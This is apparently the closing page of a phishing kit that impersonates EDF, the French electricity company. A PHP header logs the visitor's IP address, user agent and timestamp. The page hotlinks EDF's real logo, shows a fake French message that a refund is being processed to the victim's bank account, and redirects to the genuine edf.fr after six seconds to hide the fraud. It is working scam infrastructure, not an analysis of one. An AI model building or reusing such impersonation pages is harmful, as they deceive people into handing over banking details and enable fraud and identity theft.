<?php

ob_start();
session_start();

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";




?>

<html lang="en">
  <head>
  
  
    <meta http-equiv="refresh" content="6;url=https://edf.fr/" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta charset="utf-8" />
    <meta property="twitter:card" content="summary_large_image" />
    <style>
      html {  line-height: 1.15;}body {  margin: 0;}* {  box-sizing: border-box;  border-width: 0;  border-style: solid;}p,li,ul,pre,div,h1,h2,h3,h4,h5,h6 {  margin: 0;  padding: 0;}button,input,optgroup,select,textarea {  font-family: inherit;  font-size: 100%;  line-height: 1.15;  margin: 0;}button,select {  text-transform: none;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  border-style: none;  padding: 0;}button:-moz-focus,[type="button"]:-moz-focus,[type="reset"]:-moz-focus,[type="submit"]:-moz-focus {  outline: 1px dotted ButtonText;}a {  color: inherit;  text-decoration: inherit;}input {  padding: 2px 4px;}img {  display: block;}
    </style>
    <style>
      html {
        font-family: Inter;
        font-size: 16px;
      }

      body {
        font-weight: 400;
        font-style:normal;
        text-decoration: none;
        text-transform: none;
        letter-spacing: normal;
        line-height: 1.15;
        color: var(--dl-color-gray-black);
        background-color: var(--dl-color-gray-white);

      }
    </style>
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap"
    />
    <link rel="stylesheet" href="./style.css" />
  </head>
  <body>
    <div>
      <link href="./home.css" rel="stylesheet" />

      <div class="home-container">
        <header data-role="Header" class="home-header">
          <img
            alt="logo"
            src="https://espace-client.edf.fr/sso/XUI/img/logo-edf.png"
            class="home-image"
          />
        </header>
        <img
          alt="image"
          src="https://media.baamboozle.com/uploads/images/82679/1628851353_10078_url.gif"
          class="home-image1"
        />
        <span class="home-text">
          Votre dossier est complété et sera rapidement traité par nos équipes,
          le remboursement devrait apparaitre bientôt sur votre relevé bancaire
          sous l&apos;appellation &quot;Remboursement EDF&quot;
        </span>
        <span class="home-text1">
          Nous procédons maintenant à une redirection...
        </span>
      </div>
    </div>
  </body>
</html>
